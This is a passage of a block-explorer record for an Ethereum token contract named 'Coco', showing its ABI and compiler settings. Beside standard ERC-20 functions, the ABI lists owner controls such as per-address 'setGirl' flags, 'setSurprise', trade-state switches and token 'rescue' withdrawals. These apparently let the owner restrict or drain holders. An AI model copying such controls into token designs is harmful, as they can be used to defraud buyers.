{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"}],\"name\":\"isGirl\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isLimited\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"kb\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"kn\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"openLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"openTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"pair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"refreshFeeAll\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"contract IERC20\",\"name\":\"token_\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"rescueLossToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"contract IERC20\",\"name\":\"token_\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_recipient\",\"type\":\"address\"}],\"name\":\"rescueLossTokenAll\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"resetTradeState\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"reuseLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"router\",\"outputs\":[{\"internalType\":\"contract IRouter\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_user\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"b\",\"type\":\"bool\"}],\"name\":\"setExclude\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"_user\",\"type\":\"address[]\"},{\"internalType\":\"bool\",\"name\":\"b\",\"type\":\"bool\"}],\"name\":\"setExcludes\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_feeMarketingBuy\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_feeLiquidityBuy\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_feeBurnBuy\",\"type\":\"uint256\"}],\"name\":\"setFeeBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_feeMarketingSell\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_feeLiquiditySell\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_feeBurnSell\",\"type\":\"uint256\"}],\"name\":\"setFeeSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_fee\",\"type\":\"uint256\"}],\"name\":\"setFeeTransfer\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"internalType\":\"uint8\",\"name\":\"b\",\"type\":\"uint8\"}],\"name\":\"setGirl\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"user\",\"type\":\"address[]\"},{\"internalType\":\"uint8\",\"name\":\"b\",\"type\":\"uint8\"}],\"name\":\"setGirls\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"LimitBuy_\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"LimitSell_\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"LimitHold_\",\"type\":\"uint256\"}],\"name\":\"setLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_kn\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_kb\",\"type\":\"uint256\"}],\"name\":\"setSurprise\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"num\",\"type\":\"uint256\"}],\"name\":\"setSwapTokensAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"s\",\"type\":\"uint256\"}],\"name\":\"setTradeState\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"surpAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapSplit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapTokensAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradeState\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "Coco", "CompilerVersion": "v0.8.17+commit.8df45f5f", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "", "Proxy": "0", "Implementation": "", "SwarmSource": ""}